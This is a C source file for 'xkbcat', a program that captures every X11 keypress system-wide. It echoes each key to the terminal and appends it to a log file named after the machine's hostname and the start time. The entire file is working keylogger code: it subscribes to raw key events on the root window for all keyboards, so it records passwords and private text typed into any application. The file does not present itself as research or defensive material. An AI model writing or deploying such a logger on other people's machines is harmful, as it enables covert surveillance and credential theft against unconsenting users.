// xkbcat: Logs X11 keypresses, globally.

#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/limits.h>
#include <time.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define HOST_NAME_MAX 64

const char * DEFAULT_DISPLAY    = ":0";
const char * DEFAULT_LOGFILE    = "xkbcat.log";
const char * DEFAULT_HOSTNAME   = "localhost";
const bool   DEFAULT_PRINT_UP   = false;
const unsigned int BUFFER_SIZE  = 256;

static FILE * logfileStream     = NULL;


static void free_all(void)
{
    if (fclose(logfileStream) == EOF){
        perror("fclose()");
    }
}


int printUsage() {
    printf("\
USAGE: xkbcat [-display <display>] [-up]\n\
    display  target X display                   (default %s)\n\
    up       also print key-ups                 (default %s)\n\
    logfile  logfile path                       (default %s)\n",
        DEFAULT_DISPLAY, (DEFAULT_PRINT_UP ? "yes" : "no"),
        DEFAULT_LOGFILE );
    exit(EXIT_SUCCESS);
}

int main(int argc, char * argv[]) {

    const char * xDisplayName = DEFAULT_DISPLAY;
    const char hostname[HOST_NAME_MAX + 1];
    //FILE       * logfileStream = NULL;
    //char       * logfilePath  = DEFAULT_LOGFILE;
    char         logfilePath[PATH_MAX + 1];
    char         buffer[BUFFER_SIZE];
    char         timestamp[BUFFER_SIZE];
    //int          fd;
    time_t       rawtime;
    struct tm  * timeinfo;
    bool         printKeyUps  = DEFAULT_PRINT_UP;

    memset(&buffer, 0x0, BUFFER_SIZE);
    strncpy(logfilePath, DEFAULT_LOGFILE, PATH_MAX);
    strncpy(hostname, DEFAULT_HOSTNAME, HOST_NAME_MAX);

    // Get arguments
    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "-help"))     printUsage();
        else if (!strcmp(argv[i], "-up"))       printKeyUps = true;
        else if (!strcmp(argv[i], "-display")) {
            // Read next entry to find value
            ++i;
            if (i >= argc) {
                fprintf(stderr, "No value given to option `-display`\n");
                printUsage();
                exit(EXIT_FAILURE);
            }
            xDisplayName = argv[i];
        }
        else if (!strcmp(argv[i], "-logfile")) {
            // Read next entry to find value
            ++i;
            if (i >= argc) {
                fprintf(stderr, "No value given to option `-logfile`\n");
                printUsage();
                exit(EXIT_FAILURE);
            }
            // logfilePath = argv[i];
            strncpy(logfilePath, argv[i], PATH_MAX);
        }
        else { printf("Unexpected argument `%s`\n", argv[i]); printUsage(); }
    }

    // Close file stream at exit
    atexit(free_all);

    // Connect to X display
    Display * disp = XOpenDisplay(xDisplayName);
    if (NULL == disp) {
        fprintf(stderr, "Cannot open X display '%s'\n", xDisplayName);
        exit(EXIT_FAILURE);
    }

    int xiOpcode;
    { // Test for XInput 2 extension
        int queryEvent, queryError;
        if (! XQueryExtension(disp, "XInputExtension", &xiOpcode,
                    &queryEvent, &queryError)) {
            fprintf(stderr, "X Input extension not available\n");
            exit(EXIT_FAILURE);
        }
    }
    { // Request XInput 2.0, to guard against changes in future versions
        int major = 2, minor = 0;
        int queryResult = XIQueryVersion(disp, &major, &minor);
        if (queryResult == BadRequest) {
            fprintf(stderr, "Need XI 2.0 support (got %d.%d)\n", major, minor);
            exit(EXIT_FAILURE);
        } else if (queryResult != Success) {
            fprintf(stderr, "XIQueryVersion failed!\n");
            exit(EXIT_FAILURE);
        }
    }
    { // Register to receive XInput events
        Window root = DefaultRootWindow(disp);
        XIEventMask m;
        m.deviceid = XIAllMasterDevices;
        m.mask_len = XIMaskLen(XI_LASTEVENT);
        m.mask = calloc(m.mask_len, sizeof(char));
        // Raw key presses correspond to physical key-presses, without
        // processing steps such as auto-repeat.
        XISetMask(m.mask, XI_RawKeyPress);
        if (printKeyUps) XISetMask(m.mask, XI_RawKeyRelease);
        XISelectEvents(disp, root, &m, 1 /*number of masks*/);
        XSync(disp, false);
        free(m.mask);
    }

    int xkbOpcode, xkbEventCode;
    { // Test for Xkb extension
        int queryError, majorVersion, minorVersion;
        if (! XkbQueryExtension(disp, &xkbOpcode, &xkbEventCode, &queryError,
                    &majorVersion, &minorVersion)) {
            fprintf(stderr, "Xkb extension not available\n");
            exit(EXIT_FAILURE);
        }
    }
    // Register to receive events when the keyboard's keysym group changes.
    // Keysym groups are normally used to switch keyboard layouts.  The
    // keyboard continues to send the same keycodes (numeric identifiers of
    // keys) either way, but the active keysym group determines how those map
    // to keysyms (textual names of keys).
    XkbSelectEventDetails(disp, XkbUseCoreKbd, XkbStateNotify,
            XkbGroupStateMask, XkbGroupStateMask);
    int group;
    { // Determine initial keysym group
        XkbStateRec state;
        XkbGetState(disp, XkbUseCoreKbd, &state);
        group = state.group;
    }

    // Create a filename using the hostname and current timestamp:
    // xkbcat_localhost_2023-06-11_09-57-11.log
    if ( strcmp(logfilePath, DEFAULT_LOGFILE) == 0 ){
        gethostname(&hostname, HOST_NAME_MAX);

        time(&rawtime);
        timeinfo = localtime(&rawtime);

        if (timeinfo == NULL) {
            perror("localtime");
            exit(EXIT_FAILURE);
        }

        if (strftime(timestamp, sizeof(timestamp)-1, "%Y-%m-%d_%H-%M-%S", timeinfo) == 0){
             fprintf(stderr, "strftime returned 0");
             exit(EXIT_FAILURE);
        }

        snprintf(logfilePath, PATH_MAX, "xkbcat_%s_%s.log", hostname, timestamp);
    }

    if ( (logfileStream = fopen (logfilePath, "a")) == NULL){
        fprintf(stderr, "Cannot open log file '%s'\n", logfilePath);
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "Log file created: %s\n", logfilePath);
    // fprintf(logfileStream, "[%s] %s\n", asctime(timeinfo), logline);

    while ("forever") {
        XEvent event;
        XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
        XNextEvent(disp, &event);

        if (XGetEventData(disp, cookie)) {
            // Handle key press and release events
            if (cookie->type == GenericEvent
                    && cookie->extension == xiOpcode) {
                if (cookie->evtype == XI_RawKeyRelease
                        || cookie->evtype == XI_RawKeyPress) {
                    XIRawEvent *ev = cookie->data;

                    // Ask X what it calls that key; skip if unknown.
                    // Ignore shift-level argument, to show the "basic" key
                    // regardless of what modifiers are held down.
                    KeySym s = XkbKeycodeToKeysym(
                            disp, ev->detail, group, 0 /*shift level*/);

                    // Non-zero keysym groups are "overlays" on the base (`0`)
                    // group.  If the current group has no keysym for this
                    // keycode, defer to the base group instead.  (This usually
                    // happens with common shared keys like Return, Backspace,
                    // or numeric keypad keys.)
                    if (NoSymbol == s) {
                        if (group == 0) continue;
                        else {
                            s = XkbKeycodeToKeysym(disp, ev->detail,
                                    0 /* base group */, 0 /*shift level*/);
                            if (NoSymbol == s) continue;
                        }
                    }
                    char *str = XKeysymToString(s);
                    if (NULL == str) continue;

                    // Output line
                    if (printKeyUps) printf("%s",
                            cookie->evtype == XI_RawKeyPress ? "+" : "-");

                    if (strcmp(str,"Enter") == 0)          printf("<Enter>\n");
                    else if (strcmp(str,"space") == 0)     printf(" ");
                    else if (strcmp(str,"semicolon") == 0) printf(";");
                    else if (strcmp(str,"Return") == 0)    printf("<Return>\n");
                    else if (strcmp(str,"BackSpace") == 0) printf("\b");
                    else if (strcmp(str,"Shift_L") == 0)   printf("<Shift_L>");
                    else if (strcmp(str,"Shift_R") == 0)   printf("<Shift_R>");
                    else if (strcmp(str,"Alt_L") == 0)     printf("<Alt_L>");
                    else if (strcmp(str,"Alt_R") == 0)     printf("<Alt_R>");
                    else if (strcmp(str,"Control_L") == 0) printf("<Control_L>");
                    else if (strcmp(str,"Control_R") == 0) printf("<Control_R>");
                    else if (strcmp(str,"apostrophe") == 0) printf("\"");
                    else if (strcmp(str,"slash") == 0)     printf("/");
                    else if (strcmp(str,"equal") == 0)     printf("=");
                    else if (strcmp(str,"minus") == 0)     printf("-");
                    else if (strcmp(str,";") == 0)         printf(";");
                    else if (strcmp(str,"period") == 0)    printf(".");
                    else if (strcmp(str,"periodcentered") == 0) printf(".");
                    else if (strcmp(str,"comma") == 0)     printf(",");
                    else printf("%s", str);
                    fflush(stdout);

                    if (printKeyUps) fprintf(logfileStream, "%s",
                            cookie->evtype == XI_RawKeyPress ? "+" : "-");

                    if (strcmp(str,"Enter") == 0)          fprintf(logfileStream, "<Enter>\n");
                    else if (strcmp(str,"space") == 0)     fprintf(logfileStream, " ");
                    else if (strcmp(str,"semicolon") == 0) fprintf(logfileStream, ";");
                    else if (strcmp(str,"Return") == 0)    fprintf(logfileStream, "<Return>\n");
                    else if (strcmp(str,"BackSpace") == 0) fprintf(logfileStream, "\b");
                    else if (strcmp(str,"Shift_L") == 0)   fprintf(logfileStream, "<Shift_L>");
                    else if (strcmp(str,"Shift_R") == 0)   fprintf(logfileStream, "<Shift_R>");
                    else if (strcmp(str,"Alt_L") == 0)     fprintf(logfileStream, "<Alt_L>");
                    else if (strcmp(str,"Alt_R") == 0)     fprintf(logfileStream, "<Alt_R>");
                    else if (strcmp(str,"Control_L") == 0) fprintf(logfileStream, "<Control_L>");
                    else if (strcmp(str,"Control_R") == 0) fprintf(logfileStream, "<Control_R>");
                    else if (strcmp(str,"apostrophe") == 0)fprintf(logfileStream, "\"");
                    else if (strcmp(str,"slash") == 0)     fprintf(logfileStream, "/");
                    else if (strcmp(str,"equal") == 0)     fprintf(logfileStream, "=");
                    else if (strcmp(str,"minus") == 0)     fprintf(logfileStream, "-");
                    else if (strcmp(str,";") == 0)         fprintf(logfileStream, ";");
                    else if (strcmp(str,"period") == 0)    fprintf(logfileStream, ".");
                    else if (strcmp(str,"periodcentered") == 0) fprintf(logfileStream, ".");
                    else if (strcmp(str,"comma") == 0)     fprintf(logfileStream, ",");
                    else fprintf(logfileStream, "%s", str);
                    fflush(logfileStream);
                }
            }
            // Release memory associated with event data
            XFreeEventData(disp, cookie);
            // fclose(logfileStream);
        } else { // No extra data to release; `event` contains everything.
            // Handle keysym group change events
            if (event.type == xkbEventCode) {
                XkbEvent *xkbEvent = (XkbEvent*)&event;
                if (xkbEvent->any.xkb_type == XkbStateNotify) {
                    group = xkbEvent->state.group;
                }
            }
        }
    }
}
